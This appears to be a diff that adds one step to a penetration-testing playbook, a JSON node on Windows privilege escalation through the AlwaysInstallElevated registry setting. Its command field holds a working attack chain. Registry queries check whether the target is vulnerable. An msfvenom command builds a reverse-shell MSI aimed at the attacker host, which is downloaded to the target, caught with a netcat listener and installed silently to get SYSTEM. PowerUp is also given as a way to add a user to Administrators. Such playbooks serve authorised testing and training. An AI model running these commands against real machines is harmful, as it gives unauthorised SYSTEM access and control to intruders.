@@ -1,0 +1,14 @@
+{
+  "id": "always_install_elevated",
+  "phase": "WINDOWS",
+  "title": "AlwaysInstallElevated",
+  "body": "If both HKCU and HKLM AlwaysInstallElevated keys are set to 1, any user can install MSI packages as SYSTEM. winPEAS flags this automatically.",
+  "cmd": "# ── CHECK IF VULNERABLE ──────────────────────────────\nreg query HKCU\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\Installer /v AlwaysInstallElevated\nreg query HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\Installer /v AlwaysInstallElevated\n# Both must be 0x1 to be exploitable\n\n# PowerUp check\nGet-RegistryAlwaysInstallElevated\n\n# ── EXPLOIT ──────────────────────────────────────────\n# Create malicious MSI on Kali\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=443 -f msi -o evil.msi\n\n# Transfer to target\niwr http://$lhost/evil.msi -OutFile C:\\\\Windows\\\\Temp\\\\evil.msi\n\n# Set up listener on Kali\nnc -nlvp 443\n\n# Install MSI — runs as SYSTEM\nmsiexec /quiet /qn /i C:\\\\Windows\\\\Temp\\\\evil.msi\n\n# PowerUp AbuseFunction\nWrite-UserAddMSI\n# Creates a .msi that adds current user to Administrators",
+  "warn": "Both HKCU AND HKLM keys must be 0x1 — if only one is set it is not exploitable.",
+  "choices": [
+    {
+      "label": "Got SYSTEM shell",
+      "next": "got_root_windows"
+    }
+  ]
+}
